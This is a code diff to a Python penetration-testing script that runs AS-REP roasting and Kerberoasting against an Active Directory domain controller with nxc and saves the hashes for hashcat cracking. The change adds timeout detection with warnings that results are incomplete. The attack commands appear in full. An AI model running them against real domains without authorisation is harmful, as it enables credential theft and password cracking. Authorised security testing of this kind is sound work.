@@ -17,7 +17,7 @@ from pathlib import Path
 
 from npns_common import (C, RULE, log_info, log_ok, log_warn, log_err, log_step,
                          tool_exists, confirm_step, set_total_steps, enable_auto_accept,
-                         emit_progress)
+                         emit_progress, timed_out)
 
 
 set_total_steps(4)
@@ -188,12 +188,15 @@ def step3_asrep_roast(hosts: list[str], out: Path, domain: str | None,
     if (username and (password is not None or hash_)) and tool_exists("nxc"):
         creds = build_cred_args(username, password, hash_, domain)
         log_info(f"AS-REP roasting via nxc ldap (authenticated)")
-        stdout, _, _ = run(
+        stdout, stderr, _ = run(
             f"nxc ldap {shlex.quote(dc_ip)} {creds} --asreproast {shlex.quote(str(hash_file))} 2>&1",
             timeout=120,
         )
         (out / "nxc_asreproast_raw.txt").write_text(stdout)
-        if hash_file.exists() and hash_file.stat().st_size > 0:
+        if timed_out(stderr):
+            log_warn("nxc timed out during AS-REP roasting — résultat INCOMPLET "
+                     "(ne pas conclure « pre-auth activé partout »)")
+        elif hash_file.exists() and hash_file.stat().st_size > 0:
             count = len(hash_file.read_text().splitlines())
             log_ok(f"Captured {count} AS-REP hash(es) → {hash_file}  [hashcat -m 18200]")
         else:
@@ -254,12 +257,15 @@ def step4_kerberoast(hosts: list[str], out: Path, domain: str | None,
     if tool_exists("nxc"):
         creds = build_cred_args(username, password, hash_, domain)
         log_info("Kerberoasting via nxc ldap")
-        stdout, _, _ = run(
+        stdout, stderr, _ = run(
             f"nxc ldap {shlex.quote(dc_ip)} {creds} --kerberoasting {shlex.quote(str(spn_file))} 2>&1",
             timeout=120,
         )
         (out / "nxc_kerberoast_raw.txt").write_text(stdout)
-        if spn_file.exists() and spn_file.stat().st_size > 0:
+        if timed_out(stderr):
+            log_warn("nxc timed out during Kerberoasting — résultat INCOMPLET "
+                     "(ne pas conclure « aucun compte kerberoastable »)")
+        elif spn_file.exists() and spn_file.stat().st_size > 0:
             count = len(spn_file.read_text().splitlines())
             log_ok(f"Captured {count} SPN hash(es) → {spn_file}  [hashcat -m 13100]")
         else:
